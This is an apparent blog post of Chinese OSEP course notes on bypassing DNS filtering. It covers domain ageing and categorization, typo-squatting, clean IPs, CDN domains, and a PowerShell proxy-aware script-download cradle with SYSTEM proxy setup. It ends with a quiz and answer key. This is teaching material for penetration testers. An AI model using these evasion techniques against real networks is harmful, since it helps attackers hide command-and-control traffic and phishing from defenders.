---
title: OSEP-10-DNS过滤绕过
description: '10-网络过滤绕过 | 03-DNS过滤绕过'
pubDate: 2026-01-30T00:01:40+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
---

# Module 10: 网络过滤绕过

## 第二节：DNS 过滤绕过

### 为什么 DNS 过滤是第一道防线？

DNS 解析是网络通信的第一步，如果域名被阻止，后续的所有通信都无法进行。

---

## 一、DNS 过滤机制

### 1.1 过滤方式

```
DNS 请求: malicious.com
         │
         ▼
┌─────────────────────────────────────┐
│           DNS 过滤器                 │
├─────────────────────────────────────┤
│                                     │
│  1. 黑名单检查                       │
│     - 已知恶意域名列表               │
│     - malwaredomainlist.com         │
│                                     │
│  2. 域名分类检查                     │
│     - 恶意软件                       │
│     - 钓鱼网站                       │
│     - 赌博/成人内容                  │
│                                     │
│  3. 新域名检查                       │
│     - 注册时间 < 7 天                │
│     - 流量/查询量低                  │
│                                     │
│  4. 信誉评分                         │
│     - 多引擎综合评分                 │
│                                     │
└─────────────────────────────────────┘
```

### 1.2 阻止响应类型

| 响应类型 | 说明 |
|----------|------|
| 无响应 | 直接丢弃请求 |
| NXDOMAIN | 返回域名不存在 |
| Sinkhole IP | 返回假 IP 地址 |
| 重定向 | 重定向到警告页面 |

### 1.3 测试 DNS 过滤

```bash
# 使用 OpenDNS 测试域名
# www.internetbadguys.com 是 OpenDNS 的测试域名

# 使用 Google DNS（通常不过滤）
nslookup www.internetbadguys.com 8.8.8.8
# 返回: 67.215.92.210 (真实 IP)

# 使用 OpenDNS（会过滤）
nslookup www.internetbadguys.com 208.67.222.222
# 返回: 146.112.61.108 (Sinkhole IP)
```

---

## 二、绕过策略

### 2.1 域名准备

**提前准备域名**是关键，新注册的域名容易被标记为可疑。

```
域名准备时间线:
─────────────────────────────────────────────────────────
注册域名    填充内容    生成流量    开始使用
   │          │          │          │
   ▼          ▼          ▼          ▼
 第1天      第3天      第7天      第14天+
─────────────────────────────────────────────────────────
```

### 2.2 域名选择原则

| 原则 | 说明 | 示例 |
|------|------|------|
| 看起来合法 | 使用有意义的单词 | goodcompany.com |
| 避免随机字符 | 不要使用随机字符串 | ❌ x7k9m2.com |
| 选择合适分类 | 选择允许的网站类别 | 商业、技术 |
| 检查信誉 | 确保 IP 和域名干净 | 使用 VirusTotal 检查 |

### 2.3 域名分类管理

```
目标: 让域名被分类为"安全"类别

步骤:
1. 注册域名
2. 搭建看起来合法的网站（如：烹饪博客）
3. 提交到分类服务进行分类
4. 等待分类生效
5. 开始使用
```

**常见分类服务**：
- OpenDNS Domain Tagging
- Symantec Bluecoat Site Review
- Checkpoint URL Categorization

### 2.4 检查域名分类

```bash
# 使用 OpenDNS 检查域名分类
# 访问: https://domain.opendns.com/

# 使用 Symantec Bluecoat 检查
# 访问: https://sitereview.bluecoat.com/

# 使用 VirusTotal 检查域名信誉
# 访问: https://www.virustotal.com/
```

---

## 三、Typo-Squatting 技术

### 3.1 原理

利用与目标域名相似的域名，欺骗用户或绕过过滤。

```
原始域名: example.com

Typo-Squatting 变体:
├── examp1e.com    (字母替换为数字)
├── examlpe.com    (字母顺序错误)
├── exomple.com    (相似字母替换)
├── examplle.com   (重复字母)
└── example.co     (不同顶级域名)
```

### 3.2 注意事项

- 某些过滤系统可以检测 Typo-Squatting
- 可能涉及商标问题
- 主要用于钓鱼，C2 使用需谨慎

---

## 四、IP 地址信誉

### 4.1 为什么 IP 信誉重要？

即使域名干净，如果 IP 被标记为恶意，流量仍可能被阻止。

```
检查项目:
├── IP 是否在黑名单中
├── IP 历史记录
├── 共享主机上的其他网站
└── 地理位置
```

### 4.2 检查 IP 信誉

```bash
# 使用 VirusTotal 检查 IP
# 访问: https://www.virustotal.com/gui/ip-address/YOUR_IP

# 使用 IPVoid 检查
# 访问: https://www.ipvoid.com/ip-blacklist-check/

# 使用 AbuseIPDB 检查
# 访问: https://www.abuseipdb.com/check/YOUR_IP
```

### 4.3 选择干净的 IP

| 来源 | 优点 | 缺点 |
|------|------|------|
| 云服务商 | 通常干净 | 可能被监控 |
| VPS | 灵活 | 需要检查历史 |
| 共享主机 | 便宜 | 可能被污染 |
| CDN | 信誉好 | 配置复杂 |

---

## 五、使用 CDN 域名

### 5.1 原理

使用知名 CDN 服务的域名，这些域名通常被自动允许。

```
常见 CDN 域名:
├── *.cloudfront.net (Amazon)
├── *.azureedge.net (Microsoft)
├── *.akamaihd.net (Akamai)
├── *.cloudflare.com (Cloudflare)
└── *.googleapis.com (Google)
```

### 5.2 优势

- 这些域名通常被企业允许
- 流量看起来像正常的 CDN 流量
- 可以结合域前置技术

---

## 六、实践：域名信誉检查

### 6.1 检查流程

```bash
# 1. 检查域名是否在黑名单
# 访问 VirusTotal 输入域名

# 2. 检查域名分类
# 访问 Symantec Bluecoat Site Review

# 3. 检查 IP 信誉
# 使用 nslookup 获取 IP
nslookup yourdomain.com

# 然后在 IPVoid 检查该 IP

# 4. 如果域名未分类，提交分类请求
# 在 OpenDNS 或 Bluecoat 提交
```

### 6.2 域名准备清单

```
□ 域名注册时间 > 2 周
□ 网站有合法内容
□ 域名已被分类为安全类别
□ IP 地址信誉良好
□ 没有被任何黑名单收录
□ 地理位置合适
```

---

## 七、PowerShell 代理配置

### 7.1 检查代理设置

```powershell
# 检查系统代理设置
[System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://example.com")

# 检查 IE 代理设置
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" | Select-Object ProxyServer, ProxyEnable
```

### 7.2 代理感知的下载

```powershell
# 创建代理感知的 WebClient
$wc = New-Object System.Net.WebClient
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

# 下载文件
$wc.DownloadString("http://example.com/script.ps1")
```

### 7.3 SYSTEM 账户代理配置

SYSTEM 账户默认没有代理配置，需要从用户账户复制。

```powershell
# 获取用户代理设置
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
$keys = Get-ChildItem 'HKU:\'

# 查找用户 SID
ForEach ($key in $keys) {
    if ($key.Name -match 'S-1-5-21-[\d-]+$') {
        $start = $key.Name.Substring(10)
        break
    }
}

# 获取代理地址
$proxyAddr = (Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer

# 设置默认代理
[System.Net.WebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy("http://$proxyAddr")
```

---

## 八、章节测试

### 选择题

1. 新注册的域名容易被标记为什么？
   - A) 恶意软件
   - B) 钓鱼网站
   - C) Newly Seen Domain
   - D) 垃圾邮件

2. 以下哪个不是 DNS 过滤的响应方式？
   - A) 返回 Sinkhole IP
   - B) 返回 NXDOMAIN
   - C) 加密响应
   - D) 无响应

3. Typo-Squatting 的主要目的是？
   - A) 加速 DNS 解析
   - B) 利用相似域名欺骗
   - C) 加密流量
   - D) 绕过防火墙

4. 检查域名信誉应该使用哪个服务？
   - A) Google Search
   - B) VirusTotal
   - C) Wikipedia
   - D) YouTube

5. SYSTEM 账户默认有代理配置吗？
   - A) 有
   - B) 没有
   - C) 取决于系统版本
   - D) 取决于网络配置

### 实践题

1. 使用 VirusTotal 检查一个域名的信誉。

2. 使用 PowerShell 检查当前系统的代理设置。

### 答案

**选择题**：1-C, 2-C, 3-B, 4-B, 5-B

---

**下一节**：[04-Web代理与IDS绕过.md](/blog/osep/10-网络过滤绕过/04-web代理与ids绕过/) - Web 代理与 IDS 绕过技术
